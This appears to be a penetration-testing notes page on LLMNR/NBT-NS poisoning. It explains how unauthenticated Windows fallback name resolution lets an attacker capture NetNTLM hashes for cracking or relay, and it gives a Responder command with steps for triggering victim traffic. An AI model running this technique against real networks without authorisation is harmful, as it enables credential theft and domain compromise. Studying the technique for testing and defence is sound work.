# LLMNR Poisoning

### LLMNR Poisoning

LLMNR/NBT-NS poisoning abuses the fallback name-resolution protocols Windows uses when DNS fails: clients broadcast "who is HOSTNAME?" to the local subnet, and because these protocols have no authentication, any device on the network can answer and impersonate the requested host. An attacker (typically using Responder) replies to these queries, tricking clients into authenticating to them and capturing NetNTLMv1/v2 hashes, which can then be cracked offline with Hashcat or relayed (e.g. SMB relay via ntlmrelayx) to authenticate against other systems. The risk is credential theft leading to lateral movement, privilege escalation, and potentially full domain compromise, and the root cause is that these legacy broadcast protocols are enabled by default and blindly trust any responder on the local network.

<figure><img src="../../.gitbook/assets/afbeelding (2).png" alt=""><figcaption></figcaption></figure>

### Exploitation

```bash
##### REQUIREMENTS:
# this can be ran if your machine is part of the internal AD network
# it won't work if LLMNR and NBT-NS is disabled in the network
 
##### REFERENCE:
# https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/
 
##### START EXPLOITATION
 
# Step 1: setup responder to capture the hashes (make sure SMB and HTTP are disabled in responder.conf)
responder -I {{NIC}} -Pv
 
# Step 2: generate traffic, by navigating to a share that does not exist from 1 of the workstations
...
 
##### END EXPLOITATION
```



